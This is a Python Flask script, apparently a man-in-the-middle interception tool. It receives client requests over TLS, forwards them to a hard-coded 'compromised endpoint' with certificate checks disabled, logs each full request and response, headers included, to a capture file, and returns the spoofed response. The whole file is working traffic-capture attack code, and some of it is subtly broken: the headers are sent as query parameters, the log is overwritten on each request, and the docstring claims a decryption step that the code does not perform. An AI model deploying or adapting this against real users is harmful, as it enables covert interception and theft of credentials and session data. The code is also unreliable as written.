from flask import Flask, request, make_response
from requests import get


app = Flask(__name__)


LOGFILE = "captured_traffic.txt"


def log_packets(request_raw, response_raw, logfile=LOGFILE):

    with open(logfile, "w+") as log:
        log.write(
            "===\nRequest:\n---\n"
            + request_raw
            + "\n\nResponse:\n---\n"
            + response_raw
            + "\n\n"
        )


@app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
@app.route("/<path:path>")
def exoticfunction(path):
    """This exotic function will decrypt a request, forward it to the
    indended recipient (compromised endpoint), read the real response,
    and replay it back to the client."""

    # Replay the user's Request to the real endpoint and save the response
    # data. Ignore SSL verification (use self-signed certs).
    real_response = get(
        "https://192.168.18.129/" + path, request.headers, verify=False
    )

    request_raw = "{} {}\n{}\n{}".format(
        request.method,
        path,
        request.headers,
        request.data.decode("utf-8"),
    )
    response_raw = "{}\n{}\n{}".format(
        real_response.status_code,
        dict(real_response.headers.items()),
        real_response.text,
    )
    log_packets(request_raw.strip(), response_raw.strip())

    spoof = make_response()
    spoof.headers = dict(real_response.headers.items())
    spoof.data = real_response.text

    return spoof


def get_file_contents(filename):

    with open(filename) as file:
        return file.read()


def get_adhoc_context():
    return "adhoc"


SSL_CONTEXT = {"adhoc": "adhoc", "files": ("cert.pem", "key.pem")}

if __name__ == "__main__":
    app.run(ssl_context=SSL_CONTEXT["files"])
